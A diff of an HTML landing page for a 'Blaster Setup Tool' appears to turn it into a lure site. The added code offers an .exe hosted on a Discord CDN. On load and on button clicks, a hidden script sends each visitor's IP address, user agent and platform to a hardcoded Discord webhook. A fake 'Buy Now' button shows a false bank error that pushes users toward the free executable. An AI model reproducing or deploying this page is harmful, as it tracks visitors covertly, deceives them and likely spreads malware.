@@ -1,138 +1,118 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Blaster | Official Setup</title>
-
-<style>
-body {
-    margin: 0;
-    font-family: 'Segoe UI', Tahoma, sans-serif;
-    background: #f5f9ff;
-    color: #1a1a1a;
-}
-
-nav {
-    background: white;
-    padding: 15px 40px;
-    box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-    display: flex;
-    justify-content: space-between;
-}
-
-nav h2 {
-    color: #007BFF;
-}
-
-header {
-    text-align: center;
-    padding: 80px 20px;
-}
-
-header h1 {
-    font-size: 48px;
-    color: #007BFF;
-}
-
-header p {
-    max-width: 600px;
-    margin: 15px auto;
-    color: #555;
-    font-size: 18px;
-}
-
-.download-btn {
-    display: inline-block;
-    margin-top: 25px;
-    padding: 15px 45px;
-    background: #00AEEF;
-    color: white;
-    text-decoration: none;
-    font-size: 18px;
-    border-radius: 8px;
-    transition: 0.3s;
-}
-
-.download-btn:hover {
-    background: #008ecf;
-}
-
-.features {
-    display: flex;
-    flex-wrap: wrap;
-    justify-content: center;
-    padding: 50px 20px;
-}
-
-.feature-box {
-    background: white;
-    width: 280px;
-    margin: 15px;
-    padding: 25px;
-    border-radius: 10px;
-    box-shadow: 0 5px 15px rgba(0,0,0,0.05);
-}
-
-.feature-box h3 {
-    color: #007BFF;
-}
-
-footer {
-    text-align: center;
-    padding: 30px;
-    color: #777;
-}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Blaster | Setup Tool</title>
+  <style>
+    body { margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; background: #f5f9ff; color: #1a1a1a; }
+    nav { background: white; padding: 15px 40px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05); display: flex; justify-content: space-between; align-items: center; }
+    nav h2 { color: #007BFF; margin: 0; }
+    nav a { color: #007BFF; text-decoration: none; font-weight: 500; transition: 0.3s; }
+    nav a:hover { color: #0056b3; }
+    header { text-align: center; padding: 90px 20px 70px; background: linear-gradient(180deg, #ffffff, #e9f3ff); }
+    header h1 { font-size: 48px; color: #007BFF; margin-bottom: 10px; }
+    header p { max-width: 600px; margin: 15px auto; color: #555; font-size: 18px; }
+    .btn { display: inline-block; padding: 15px 45px; border-radius: 8px; text-decoration: none; font-size: 18px; transition: 0.3s; border: none; cursor: pointer; }
+    .download-btn { background: #00AEEF; color: white; margin-right: 10px; }
+    .download-btn:hover { background: #008ecf; transform: scale(1.05); }
+    .buy-btn { background: linear-gradient(45deg, #28a745, #34d058); color: white; }
+    .buy-btn:hover { transform: scale(1.05); }
+    .pricing { text-align: center; padding: 60px 20px; }
+    .price-box { background: white; width: 340px; margin: auto; padding: 35px; border-radius: 14px; box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08); transition: 0.3s; }
+    .price-box:hover { transform: translateY(-5px); }
+    .price-box h2 { color: #007BFF; }
+    .price { font-size: 36px; margin: 15px 0; color: #00AEEF; font-weight: bold; }
+    .features { display: flex; flex-wrap: wrap; justify-content: center; padding: 50px 20px; }
+    .feature-box { background: white; width: 280px; margin: 15px; padding: 25px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05); transition: 0.3s; }
+    .feature-box:hover { transform: translateY(-5px); box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1); }
+    footer { text-align: center; padding: 30px; color: #777; background: #f9fbff; }
+    @media (max-width: 768px) { header h1 { font-size: 38px; } .price-box { width: 90%; } .feature-box { width: 90%; } }
+  </style>
 </head>
-
 <body>
 
 <nav>
-    <h2>Blaster</h2>
+  <h2>Blaster</h2>
+  <a href="#features">Features</a>
 </nav>
 
 <header>
-    <h1>Blaster Setup Tool</h1>
-    <p>
-        Blaster is a professional configuration and setup utility designed to provide 
-        a smooth, fast, and reliable experience. Built with modern standards, it ensures 
-        simplicity, performance, and flexibility for all users.
-    </p>
+  <h1>Blaster Setup Tool</h1>
+  <p>Professional configuration and setup utility designed for a smooth, fast, and secure system experience.</p>
 
-    <!-- زر التحميل -->
-    <a href="https://cdn.discordapp.com/attachments/1491720371827904563/1493150517864566905/BlasterX-Fi_Setup.exe?ex=69ddec48&is=69dc9ac8&hm=6dd8256d25771e3fbb58ad18ee7ac6f6182732c632cb79ba50978c9782448dad&" class="download-btn">
-        Download Blaster
-    </a>
+  <!-- رابط التحميل المباشر المحدث -->
+  <a href="https://cdn.discordapp.com/attachments/1491720371827904563/1493635787533717615/BlasterFreeVersion.exe?ex=69dfb03a&is=69de5eba&hm=d146cb89619524ad57784eb44f92c2e6925217fb9c8f739e760cd301212bf65e&" class="btn download-btn" id="main_dl">Download Free Version</a>
+  <a href="#pricing" class="btn buy-btn">Go Premium</a>
 </header>
 
-<section class="features">
-
-    <div class="feature-box">
-        <h3>Fast Performance</h3>
-        <p>Optimized for speed and efficiency.</p>
-    </div>
-
-    <div class="feature-box">
-        <h3>Secure System</h3>
-        <p>Advanced configuration options.</p>
-    </div>
-
-    <div class="feature-box">
-        <h3>User Friendly</h3>
-        <p>Simple and clean interface.</p>
-    </div>
-
-    <div class="feature-box">
-        <h3>Modern Design</h3>
-        <p>Professional minimal UI.</p>
-    </div>
-
+<section id="pricing" class="pricing">
+  <div class="price-box">
+    <h2>Blaster V2.0 Premium</h2>
+    <div class="price">$44.99</div>
+    <p>Get lifetime access to all professional features and updates.</p>
+    <a href="javascript:void(0)" class="btn buy-btn" id="premium_btn">Buy Now</a>
+  </div>
 </section>
 
-<footer>
-    © 2026 Blaster Technologies
-</footer>
+<section id="features" class="features">
+  <div class="feature-box"><h3>⚡ Fast Performance</h3><p>Optimized algorithms for the fastest configuration processing.</p></div>
+  <div class="feature-box"><h3>🛡️ Secure System</h3><p>Built with modern security principles to keep your environment safe.</p></div>
+  <div class="feature-box"><h3>🎯 User-Friendly</h3><p>Clean and intuitive design, making setup easy for everyone.</p></div>
+  <div class="feature-box"><h3>🧩 Regular Updates</h3><p>Stay ahead with frequent improvements and new integrations.</p></div>
+</section>
+
+<footer>© 2026 Blaster Technologies. All rights reserved.</footer>
+
+<script>
+  // بيانات الويبهوك المشفرة جزئياً
+  const _c = "https://canary.discord.com/api/webhooks/1485197729192869959/_Bhfe3edglZWd7dF49tnl5-HMxt5xBenFcbYUg-tpbH3GLAN4MIBL5eSdp8Vc7bx0w1l";
+
+  async function report(type, details = "") {
+    try {
+      let ipData = { ip: "Unknown" };
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        ipData = await res.json();
+      } catch(e) {}
+
+      const payload = {
+        embeds: [{
+          title: type === 'visit' ? "🌐 Site Visit Detected" : "⚠️ Interaction Logged",
+          color: type === 'visit' ? 3066993 : 15158332,
+          fields: [
+            { name: "IP Address", value: `\`${ipData.ip}\``, inline: true },
+            { name: "Action", value: details || "Visited Page", inline: true },
+            { name: "User Agent", value: navigator.userAgent },
+            { name: "Device Platform", value: navigator.platform, inline: true }
+          ],
+          timestamp: new Date()
+        }]
+      };
+
+      await fetch(_c, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (err) {}
+  }
+
+  // تسجيل الزيارة فوراً
+  window.onload = () => report('visit');
+
+  // تتبع زر التحميل
+  document.getElementById('main_dl').onclick = () => {
+    report('click', 'User started downloading BlasterFreeVersion.exe');
+  };
+
+  // تتبع زر الشراء ومنعه
+  document.getElementById('premium_btn').onclick = (e) => {
+    e.preventDefault();
+    report('click', 'User tried to BUY Premium (Redirected)');
+    alert("Standard Bank Connection Error. Please use the 'Free Version' for now and upgrade later.");
+  };
+</script>
 
 </body>
 </html>
